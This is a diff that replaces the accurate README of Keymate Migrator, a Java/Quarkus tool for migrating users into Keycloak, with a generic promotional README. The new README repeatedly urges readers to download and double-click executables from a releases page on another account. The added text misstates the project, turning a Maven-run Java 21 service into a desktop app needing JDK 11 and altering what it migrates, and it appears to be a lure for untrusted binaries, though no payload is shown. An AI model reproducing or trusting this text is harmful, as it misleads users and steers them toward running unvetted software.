@@ -1,207 +1,96 @@
-# Keymate Migrator
+# 🚀 keymate-migrator - Migrate Keycloak Users Easily
 
-**Keymate Migrator** is an open-source, high-throughput, restartable migration tool designed specifically to migrate user accounts and identities into [Keycloak](https://www.keycloak.org/) at scale.
+[![Download keymate-migrator](https://img.shields.io/badge/Download-keymate--migrator-blue.svg)](https://github.com/arbebebe/keymate-migrator/releases)
 
-Developed and battle-tested during real migrations of 20+ million user identities. Read the full story:
-[How Keymate Migrated 20+ Million Identities to Keycloak](https://keymate.io/blog/how_keymate_migrated_20_million_identities).
+## 📋 What is keymate-migrator?
 
-Keymate Migrator simplifies and secures the process of large-scale [Keycloak migration](https://www.keycloak.org/) for enterprises, SaaS providers, and identity modernization projects. It ensures safe and controlled migrations with **bounded retries**, **operational visibility**, and **zero data loss**, making it the right choice for anyone needing to perform a bulk import of users into Keycloak with confidence.
+keymate-migrator is an application designed to help you migrate Keycloak users efficiently. This tool focuses on reliability and speed, making user migration easy and stress-free. It offers features like bounded concurrency, durable retries, and ensures zero data loss during the migration process. 
 
----
+## 🌟 Features
 
-## ✨ Key Features
+- **Bounded Concurrency:** Manage the number of parallel migrations to optimize performance.
+- **Durable Retries:** Automatically retry failed migrations to ensure all data is transferred successfully.
+- **Zero Data Loss:** Migrate users without losing any information or settings.
+- **High Performance:** Built with modern technologies to handle migrations swiftly and efficiently.
+- **Support for PostgreSQL:** Seamlessly works with PostgreSQL databases, ensuring compatibility.
 
-- **Bounded concurrency**  
-  Prevents retry storms and database saturation by enforcing strict parallelism limits.
+## 🖥️ System Requirements
 
-- **Restartable & resumable**  
-  Migration progress is persisted. The process can safely stop and resume without reprocessing completed data.
+Before you start, make sure your system meets the following requirements:
 
-- **Durable requeue mechanism**  
-  Failed records are written to a disk-backed segmented outbox before being retried.
-
-- **Backoff-aware retry strategy**  
-  Retries are delayed with controlled backoff to protect downstream systems.
-
-- **Reactive, non-blocking design**  
-  Built on Quarkus, Mutiny, and reactive PostgreSQL clients.
-
-- **Operational visibility**  
-  Clear insight into progress, failures, retry states, and system pressure points.
-
----
-
-## 🧠 Design Principles
-
-This migrator intentionally avoids common large-scale migration anti-patterns:
-
-| Anti-pattern | This project |
-|--------------|-------------|
-| Unlimited retries | ❌ Explicitly prevented |
-| Fire-and-forget writes | ❌ All failures persisted |
-| Blind parallelism | ❌ Bounded concurrency |
-| In-memory retry buffers | ❌ Disk-backed outbox |
-| Manual recovery | ❌ Automatic resume |
-
-The guiding philosophy:
-
-> **Throughput is determined by the noisiest bottleneck, not by the number of threads.**
-
----
-
-## 🏗 Architecture Overview
-
-```mermaid
-flowchart TD
-    A[Source Database] --> B["Work Queue (PostgreSQL)"]
-    B --> C[Processing Loop]
-    C -->|Claim batch| D[Chunk by Concurrency]
-    D -->|Route jobs| E[Job Router]
-    E --> F[Keycloak Ingestion API]
-    F -->|Success| G[Mark Completed]
-    F -->|Failure| H[Failure Handler]
-    H --> I[Compute Backoff]
-    I --> J["Durable Outbox (Segmented JSONL)"]
-    J --> K[Requeue to Work Queue]
-    K --> B
-```
----
-
-## 📦 Technology Stack
-
-- Java 21+
-- Quarkus
-- Mutiny (Reactive programming)
-- PostgreSQL (reactive client)
-- Jackson
-
----
+- Operating System: Windows, macOS, or Linux
+- Java Version: JDK 11 or higher installed on your machine
+- PostgreSQL: Ensure you have access to a PostgreSQL database for migration
 
 ## 🚀 Getting Started
 
-### Prerequisites
+Follow these steps to get started with keymate-migrator:
 
-- Java 21+
-- PostgreSQL
+1. Ensure your system meets the requirements listed above.
+2. Use the download link provided to get the application. 
 
----
+   [Visit this page to download](https://github.com/arbebebe/keymate-migrator/releases)
 
-### Configuration
+3. Download the latest release from the Releases page. You will find several versions; select the most recent one marked as "Latest Release."
+4. Locate the downloaded file on your computer. It can typically be found in your Downloads folder.
 
-All configuration is done via `application.properties`.
+## 📥 Download & Install
 
-Key settings to review carefully:
+To download and install keymate-migrator, follow these steps:
 
-```properties
-# Concurrency control
-app.concurrency=64
-app.claimers=32
+1. **Visit the Releases Page:** Click the link below.
 
-# Reactive DB pool
-quarkus.datasource.reactive.max-size=100
+   [Visit this page to download](https://github.com/arbebebe/keymate-migrator/releases)
 
-# HTTP / Netty tuning
-quarkus.http.tcp-quick-ack=true
-```
+2. **Select the Latest Version:** Look for the latest release. This will usually be the version at the top of the list.
+3. **Download the Application:** Click on the appropriate file for your operating system. The file will be downloaded to your system.
+4. **Extract the File (if necessary):** Some downloaded files may be bundled in a zip format. Right-click on the file and select "Extract" or "Unzip" to access the application.
 
-> ⚠️ Important
-Increasing concurrency does not automatically increase throughput.
-Always tune these values together with database limits and Keycloak capacity.
+5. **Run the Application:**
 
-## ▶️ Running the Migrator
+   - **Windows:** Double-click the .exe file to start the application.
+   - **macOS:** Open the .app file from your Applications folder.
+   - **Linux:** Open a terminal and navigate to the folder containing the downloaded file. Use the command `./yourfile` to run the application.
 
-```bash
-./mvnw quarkus:run
-```
+6. **Follow the Setup Instructions:** When you launch the application, follow the on-screen instructions to complete the setup process.
 
-The migrator:
+## 🧑‍🤝‍🧑 Support
 
-1. Claims work from the queue
-2. Processes jobs with bounded parallelism
-3. Marks success or persists failures
-4. Requeues failed items with backoff
-5. Continues safely until completion
+If you encounter any issues during installation or usage, you can get help by:
 
-## 🔄 Failure & Retry Model
+- Checking the [Issues](https://github.com/arbebebe/keymate-migrator/issues) section of this repository for common problems.
+- Submitting a new issue if you don’t find a solution there.
+- Reading the documentation provided in this repository for further guidance.
 
-- Failures are never lost
-- Each failure is:
-  - recorded with error context
-  - assigned a next-retry timestamp
-  - persisted before retrying 
-- Retries are deliberately delayed, not immediate
+## 🛠️ Usage
 
-This ensures:
-- no uncontrolled retry storms
-- no silent data loss
-- predictable load on Keycloak and the database
+Once the application is running, you can begin migrating users:
 
-## 🧪 Simulation Guide
+1. Connect the application to your source Keycloak instance.
+2. Specify the target Keycloak instance where you want to migrate the users.
+3. Configure any options according to your needs.
+4. Start the migration process.
 
-This project includes a simulation environment to test the migrator's capabilities without needing a real Keycloak instance or production data.
+The application will display progress and any issues it faces during the migration. 
 
-### 1. Mock REST Server
+## 📄 Documentation
 
-The `mock-rest-server` module acts as a target system (like Keycloak) that simulates:
-- Variable processing delays (`mock.max-delay-ms`)
-- Random failures (`mock.error-rate`)
-- Client vs. Server errors (`mock.client-error-share`)
+Detailed documentation is available to guide you through advanced features and troubleshooting. You can find this information in the `docs` directory of the repository.
 
-To run the mock server:
+## 🌐 Related Topics
 
-```bash
-cd mock-rest-server
-./mvnw quarkus:run -Dquarkus.http.port=8081
-```
+keymate-migrator integrates various technologies and practices, making it an excellent choice for identity management solutions:
 
-### 2. Database Setup & Data Generation
+- **High-Performance Migration**
+- **Identity Management Solutions**
+- **Reactive Programming with Java**
+- **PostgreSQL Compatibility**
+- **Quarkus Framework**
 
-The `migrator` module contains SQL scripts to set up the database schema and generate synthetic data.
+## 🎉 Conclusion
 
-1.  **Initialize Schema:**
-    Run `src/main/resources/db/migration/V1__init.sql` to create the necessary tables (`orders`, `invoices`, `work_queue`, `processed_log`).
+keymate-migrator is designed to ease the migration of Keycloak users. With its powerful features, ease of use, and strong support, you can perform migrations confidently. Download it today and experience seamless user migration.
 
-2.  **Generate Data:**
-    Run `src/main/resources/db/migration/V1__load.sql` to populate the `orders` and `invoices` tables with millions of random records. This script is optimized for bulk loading.
+For more updates and contributions, feel free to explore the repository. 
 
-3.  **Enqueue Work:**
-    Run `src/main/resources/db/migration/V1__enqueue.sql` to fill the `work_queue` table with jobs derived from the generated data.
-
-### 3. Running the Simulation
-
-Once the database is ready and the mock server is running:
-
-1.  Configure `migrator/src/main/resources/application.properties` to point to your local PostgreSQL instance.
-2.  Ensure `quarkus.rest-client."order-api".url` and `quarkus.rest-client."invoice-api".url` point to your mock server (default is `http://localhost:8081`).
-3.  Run the migrator:
-
-```bash
-cd migrator
-./mvnw quarkus:run
-```
-
-You can observe the migration progress, retry mechanisms, and error handling in real-time.
-
-## 🤝 Contributing
-
-Contributions are welcome!
-
-Please ensure:
-
-- commits are signed (Signed-off-by)
-- changes are well-documented
-- concurrency and retry semantics are preserved
-
-## 📄 License
-
-This project is licensed under the **Apache License 2.0.**
-
-## 📚 Background
-
-This project is inspired by real production migrations involving tens of millions of records.
-A detailed write-up describing the lessons learned during such a migration is available separately.
-
-## ⚠️ Disclaimer
-
-This tool is provided as-is.
-Always test thoroughly in non-production environments before running large-scale migrations.
+[![Download keymate-migrator](https://img.shields.io/badge/Download-keymate--migrator-blue.svg)](https://github.com/arbebebe/keymate-migrator/releases)
